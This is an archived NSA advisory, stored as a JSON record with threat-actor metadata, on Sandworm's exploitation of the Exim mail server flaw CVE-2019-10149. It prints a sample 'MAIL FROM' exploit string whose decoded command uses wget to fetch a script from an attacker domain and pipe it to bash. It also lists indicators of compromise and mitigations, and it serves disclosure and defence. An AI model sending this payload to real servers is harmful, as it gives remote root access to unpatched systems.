{
    "id": "5f939c83-6a7e-434e-9e02-0f7b07f4d5ef",
    "created_at": "2023-01-12T14:59:11.426053Z",
    "updated_at": "2025-03-27T02:17:05.78709Z",
    "deleted_at": null,
    "sha1_hash": "af351d85b2ef5ef7ddfa4de15710e84c7df955dd",
    "title": "2020-05-28 - CSA Sandworm Actors Exploiting Vulnerability in Exim Transfer Agent",
    "authors": "",
    "file_creation_date": "2020-05-27T15:12:08Z",
    "file_modification_date": "2020-05-27T15:12:08Z",
    "file_size": 283948,
    "plain_text": "# SANDWORM ACTORS EXPLOITING VULNERABILITY IN\n\n EXIM MAIL TRANSFER AGENT\n\n### Summary\n\nRussian cyber actors from the GRU Main Center for Special Technologies (GTsST), field post number 74455, have been\nexploiting a vulnerability in Exim Mail Transfer Agent (MTA) software since at least August 2019. The cyber actors\nresponsible for this malicious cyber program are known publicly as Sandworm team.\n\nExim is a commonly used MTA software for Unix[®1]-based systems and comes pre-installed on some Linux distributions\nsuch as Debian[®2]. On 5 June 2019, an update for a critical vulnerability (CVE-2019-10149) in Exim was released. The\nremote code execution vulnerability was introduced in Exim version 4.87. An unauthenticated remote attacker can send a\nspecially crafted email to execute commands with root privileges allowing the attacker to install programs, modify data,\nand create new accounts [1]. An advisory was published to the Exim webpage urging users to update to the newest\nversion as older versions are unsupported [2].\n\nThe actors exploited victims using Exim software on their public facing MTAs by sending a command in the \"MAIL FROM\"\nfield of an SMTP (Simple Mail Transfer Protocol) message. Below is a sample, which contains parameters the actor would\nmodify per deployment.\n\n```\nMAIL FROM:<${run{\\x2Fbin\\x2Fsh\\tc\\t\\x22exec\\x20\\x2Fusr\\x2Fbin\\x2Fwget\\x20\\x2DO\\x20\\x2D\\x20http\\:\\x2F\\x2F\\hostapp.be\\x2Fscript1.sh\\x20\\x7C\\\nx20bash\\x22}}@hostapp.be>\nHex decoded command:\n/bin/sh -c \"exec /usr/bin/wget -O - http://hostapp.be/script1.sh | bash\"\n\n```\n\n**_Figure 1: Sample “MAIL FROM” exploitation command_**\n\nWhen CVE-2019-10149 is successfully exploited, an actor is able to execute code of their choosing. When Sandworm\nexploited CVE-2019-10149, the victim machine would subsequently download and execute a shell script from a\nSandworm-controlled domain. This script would attempt to do the following on the victim machine:\n\n#####  add privileged users\n  disable network security settings\n  update SSH configurations to enable additional remote access\n  execute an additional script to enable follow-on exploitation\n\n### Mitigation Actions\n\n#### Apply Exim Updates Immediately\n\nUpdate Exim immediately by installing version 4.93 or newer to mitigate this and other vulnerabilities. Other vulnerabilities\nexist and are likely to be exploited, so the latest fully patched version should be used [3]. Using a previous version of Exim\n\n1 Unix is a registered trademark of The Open Group.\n\n2 Debian is a registered trademark of Software in the Public Interest, Inc.\n\n\n-----\n\nleaves a system vulnerable to exploitation. System administrators should continually check software versions and update\nas new versions become available [4].\n\nAdministrators can update Exim Mail Transfer Agent software through their Linux distribution’s package manager or by\ndownloading the latest version from https://exim.org/mirrors.html.\n\n#### Detect Exploit Attempts and Unauthorized Changes\n\nAdditionally, network-based security appliances may be able to detect and/or block CVE-2019-10149 exploit attempts. For\nexample, Snort[®3] rule 1-50356 alerts on exploit attempts by default for registered users of a Snort Intrusion Detection\nSystem (IDS) [5]. Administrators are encouraged to review network security devices protecting Exim mail servers both for\nidentifying prior exploitation and for ensuring network-based protection for any unpatched Exim servers. Raw traffic logs\ncan also be queried for emails with a recipient containing “${run”, which would likely indicate a CVE-2019-10149 exploit\nattempt. Other attack methods exist for non-default configurations and may not be detected using these methods.\n\nRoutinely verifying no unauthorized system modifications, such as additional accounts and SSH keys, have occurred can\nhelp detect a compromise. To detect these modifications, administrators can use file integrity monitoring software that\nalerts an administrator or blocks unauthorized changes on the system.\n\n#### Apply Defense-in-Depth Security Strategy\n\nSecurity principles such as least access models and defense-in-depth should be applied when installing public facing\nsoftware such as MTAs and can help prevent exploitation attempts from being successful. Network segmentation should\nbe used to separate networks into zones based on roles and requirements. Public facing MTAs should be isolated from\nsensitive internal resources in a demilitarized zone (DMZ) enclave. When using a DMZ for public Internet facing systems,\nfirewall rules are important to block unexpected traffic from reaching trusted internal resources. In addition, MTAs should\nonly be allowed to send outbound traffic to necessary ports (e.g. 25, 465, 587), and unnecessary destination ports should\nbe blocked. Least access model firewall rules around a DMZ can inhibit attackers from gaining unauthorized access, as\nunexpected port traffic should be blocked by default.\n\nIf an MTA DMZ was configured in a least access model, for example to deny by default MTA initiated outbound traffic\ndestined for port 80/443 on the Internet while only permitting traffic initiated from an MTA to necessary hosts on port\n80/443, the actors’ method of using CVE-2019-10149 would have been mitigated.\n\n#### Indicators of Compromise (IOC)\n\nSince at least August 2019, the following IP addresses and domains were associated with these attacks from the\nSandworm actor:\n\n#####  95.216.13.196 \n  103.94.157.5 \n  hostapp.be\n\n### Works Cited\n\n[1] Narang, S. (2019), CVE-2019-10149: Critical Remote Command Execution Vulnerability Discovered in Exim. [Online] Available at:\n[https://tenable.com/blog/cve-2019-10149-critical-remote-command-execution-vulnerability-discovered-in-exim](https://tenable.com/blog/cve-2019-10149-critical-remote-command-execution-vulnerability-discovered-in-exim) [Accessed Feb. 12, 2020]\n\n[2] [Exim (2019). CVE-2019-10149 Exim 4.87 to 4.91. [Online] Available at: https://www.exim.org/static/doc/security/CVE-2019-10149.txt](https://www.exim.org/static/doc/security/CVE-2019-10149.txt)\n\n[Accessed Feb. 12, 2020]\n\n[3] [NCSC (2019). Advisory: Exim mail server vulnerabilities. [Online] Available at: https://www.ncsc.gov.uk/news/exim-mail-server-vulnerabilities-](https://www.ncsc.gov.uk/news/exim-mail-server-vulnerabilities-advisory)\nadvisory [Accessed Feb. 12, 2020]\n\n[4] [NSA (2019). Update and Upgrade Software Immediately. [Online] Available at: https://media.defense.gov/2019/Sep/09/2002180319/-1/-](https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/UPDATE%20AND%20UPGRADE%20SOFTWARE%20IMMEDIATELY.PDF)\n[1/0/UPDATE AND UPGRADE SOFTWARE IMMEDIATELY.PDF [Accessed Feb. 12, 2020]](https://media.defense.gov/2019/Sep/09/2002180319/-1/-1/0/UPDATE%20AND%20UPGRADE%20SOFTWARE%20IMMEDIATELY.PDF)\n\n[5] [The Snort Team (2019). Sid 1-50356. [Online] Available at https://snort.org/rule_docs/1-50356](https://snort.org/rule_docs/1-50356) [Accessed Feb. 12, 2020]\n\n3 Snort is a registered trademark of Cisco Technology, Inc.\n\n##### U/OO/140757-20 PP-20-0393 28 May 2020 2\n\n\n-----\n\n#### Disclaimer of Endorsement\n\nThe information and opinions contained in this document are provided \"as is\" and without any warranties or guarantees. Reference herein to any specific\ncommercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement,\nrecommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.\n\n#### Contact\n\n[Client Requirements / General Cybersecurity Inquiries: Cybersecurity Requirements Center, 410-854-4200, Cybersecurity_Requests@nsa.gov](mailto:Cybersecurity_Requests@nsa.gov)\n[Media inquiries / Press Desk: 443-634-0721, MediaRelations@nsa.gov](mailto:MediaRelations@nsa.gov)\n\n##### U/OO/140757-20 PP-20-0393 28 May 2020 3\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-05-28 - CSA Sandworm Actors Exploiting Vulnerability in Exim Transfer Agent.pdf",
        "https://media.defense.gov/2020/May/28/2002306626/-1/-1/0/CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
    ],
    "report_names": [
        "2020-05-28 - CSA Sandworm Actors Exploiting Vulnerability in Exim Transfer Agent.pdf",
        "CSA%20Sandworm%20Actors%20Exploiting%20Vulnerability%20in%20Exim%20Transfer%20Agent%2020200528.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535551,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1590592328,
    "ts_modification_date": 1590592328,
    "files": {
        "pdf": "https://archive.orkl.eu/af351d85b2ef5ef7ddfa4de15710e84c7df955dd.pdf",
        "text": "https://archive.orkl.eu/af351d85b2ef5ef7ddfa4de15710e84c7df955dd.txt",
        "img": "https://archive.orkl.eu/af351d85b2ef5ef7ddfa4de15710e84c7df955dd.jpg"
    }
}